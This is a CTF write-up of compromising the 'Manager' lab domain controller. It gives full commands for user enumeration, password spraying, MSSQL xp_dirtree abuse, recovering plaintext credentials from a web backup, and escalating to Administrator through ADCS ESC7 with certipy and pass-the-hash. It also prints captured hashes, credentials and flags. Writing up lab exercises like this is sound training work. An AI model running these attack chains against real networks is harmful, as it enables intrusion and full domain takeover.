
## CTF Writeup: Manager

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.55.175 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 08:02 -0500
Nmap scan report for 10.129.55.175
Host is up (0.018s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 20:04:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-08-12T20:05:40+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T20:05:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-08-12T20:05:40+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.55.175:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-12T19:57:16
|_Not valid after:  2056-08-12T19:57:16
| ms-sql-info: 
|   10.129.55.175:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T20:05:40+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-12T20:05:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49772/tcp open  unknown
49793/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-12T20:05:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.60 seconds
```

The target seems to be an Domain Controller. The TCP Scan reveals an domain called "manager.htb", the hostname "DC01", the FQDN "dc01.manager.htb". 

```
echo "10.129.55.175 dc01.manager.htb manager.htb dc01" | tee -a /etc/hosts
```

There seems to be an active webpage running on port 80 and and publicly accessible MSSQL Database.

I started with checking if anonymous & guest access is enabled. Guest user is enabled.

```
nxc smb manager.htb -u 'guest' -p '' --shares
```

Enumerated domain users.

```
nxc smb manager.htb -u 'guest' -p '' --rid-brute > newusers.txt
```

Formatted the output accordingly into an wordlist for future bruteforcing purposes.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Tried ASREP-Roasting any user in the wordlist, but couldn't retrieve an TGT.

```
impacket-GetNPUsers -dc-ip 10.129.55.175 manager.htb/ -no-pass -usersfile users.txt
```

Tried enumerating subdomains on the target server.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://manager.htb -H "Host: FUZZ.manager.htb" -fs 18203
```

I tried to analyze the website, but there isn't anything interesting. The website has no functionality & seems still in development. There were no interesting endpoints or subdomains aswell. Let's move on.

Tried getting LDAP Information, but as anonyous user wasn't possible.

```
ldapsearch -x -H ldap://10.129.55.175 -b "dc=manager,dc=htb" > ldapsearch.txt
```

I had to follow guided mode to proceed.

Enumerated SID & RID's.

```
impacket-lookupsid manager.htb/guest:''@10.129.55.175
```

I created an custom wordlist with my custom username generator tool 

```
python3 username_generator.py --all /ctfs/htb/ad/manager/creds/users.txt > users2.txt
```

Sprayed passwords with the generated wordlist and found an hit!

```
nxc smb manager.htb -u users.txt -p users2.txt
```

Gained valid domain user credentials.

```
Operator:operator
```

Let's retrieve domain information first using bloodhound-python.

```
bloodhound-python -u Operator -p 'operator' -ns 10.129.55.175 -d manager.htb -c all
```

Marked current user "Operator" as owned, but couldn't find any interesting ACL's which could potentially lead to Privilege Escalation. Checked if Kerberoasting is possible, but there is no kerberoastable domain user.

Let's proceed with checking out ldap information.

```
ldapsearch -H "ldap://manager.htb" -D Operator@manager.htb -w 'operator' -b "dc=manager,dc=htb" "*" > ldapsearch.txt
```

Checked out interesting LDAP Information, but couldn't find anything.

```
cat ldapsearch.txt | grep dn
cat ldapsearch.txt | grep info
cat ldapsearch.txt | grep description
```

Proceeded with checking out the MSSQL Database. Connected to it via impacket-mssqlclient and gained MSSQL Shell.

```
impacket-mssqlclient manager.htb/Operator@dc01.manager.htb -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

Tried enumerating Databases, but there is only default databases.

```
SELECT name FROM sys.databases;
```

Checked if we are an admin account, but we aren't!

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Tried multiple things aswell like activating xp_cmdshell etc. but all didn't seem to work.

BUT xp_dirtree is active! We can see that user "Raven" has an Users Directory on the Domain Controller.

```
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\Users\', 1,0;
subdirectory    depth   
-------------   -----   
Administrator       1   
All Users           1   
Default             1   
Default User        1   
Public              1   
Raven               1
```

Tried to perform an MITM Attack, by creating an fakeshare with responder and then capturing the NTLM Hash. The Problem is we were only able to capture the NTLM Hash of the Machine Account, which is almost impossible to crack.

```
DC01$::MANAGER:674b67e5ec84619d:8CDDCF20713B2DE961AC42550ABD0EDE:0101000000000000000EAAA7462ADD017CF4F341F6CA336E0000000002000800550031004D004A0001001E00570049004E002D004D00590058004C005700550059004E0043003800550004003400570049004E002D004D00590058004C005700550059004E004300380055002E00550031004D004A002E004C004F00430041004C0003001400550031004D004A002E004C004F00430041004C0005001400550031004D004A002E004C004F00430041004C0007000800000EAAA7462ADD01060004000200000008003000300000000000000000000000003000001A386ACF495E1C134BF5768A5E0FAB473B86AD54577024951F1FC29DEC7E37CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350037000000000000000000
```

Decided to proceed enumerating interesting files on the target server using xp_dirtree.

```
xp_dirtree \
```

Enumerate Webserver

```
xp_dirtree \inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
```

As we can see from the server response, there seems to be an interesting backup .zip file stored in the web-root. Let's try & download it onto our local machine.

```
wget http://manager.htb/website-backup-27-07-23-old.zip
```

Unzipped the file & gained a lot of files.

```
unzip website-backup-27-07-23-old.zip
```

Retrieved Credentials of user "raven".

```
cat .old-conf.xml                   
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

```
raven:R4v3nBe5tD3veloP3r!123
```

Since we previously discovered that user "Raven" has an user directory on the target server, I'm assuming we can connect to the Domain Controller with it. It worked!

```
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

Retrieved user.txt in C:\Users\Raven\Desktop.

```
ffdb620238099f18c7b2e6f3e3cbb066
```

## Privilege Escalation

Enumerated Groups & Privileges of user "Raven", but wasn't able to find anything interesting.

```
whoami /all
```

Marked user Raven as owned in BloodHound, but wasn't able to identify anything interesting there either.

I transfered nc.exe and winPEAS.exe onto the target server. Ran winPEAS.

winPEAS revealed that there might be some misconfigurations in ADCS.

Let's check that out to enumerate vulnerable templates:

```
certipy-ad find -u Raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.55.175 -target manager.htb -vulnerable -enabled
```

This revealed that our current user Raven could abuse ESC7. He has "ManageCA" over the CA.

```
cat 20260812114458_Certipy.txt
[!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

I decided to delete my domain information on bloodhound & download domain information via rusthound-ce so we can see ADCS Relationships better.

```
rusthound-ce --domain manager.htb -u Raven -p 'R4v3nBe5tD3veloP3r!123'
```

Uploaded Domain Information onto BloodHound. Let's now try & abuse ESC7.

1. To exploit this I need to add user "Raven" as "Officer", so that we can manage certificates.

```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.55.175 -ca manager-dc01-ca -add-officer raven -debug
```

Now that we are officer, we can issue and manage certificates. 

2. The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS. The SubCA template serves as a predefined set of configurations and policies governing the issuance of certificates. 

**WARNING:** Even if this fails, save the key on your local machine to proceed.
```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

3. Then using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:

**WARNING**: Utilize the number of the key for the --issue-request parameter.
```
certipy-ad ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

4. Retrieve the administrator certificate.

**WARNING**: Utilize the number of the key for the -retrieve parameter.
```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

5. Authenticate against the CA as Administrator to harvest NTLM Hash.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.55.175
```

Connected to the Domain Controller as Administrator user via evil-winrm.

```
evil-winrm -i dc01.manager.htb -u Administrator -H ae5064c2f62317332c88629e025924ef
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
88305bc3aa9e8ae53351298e74692425
```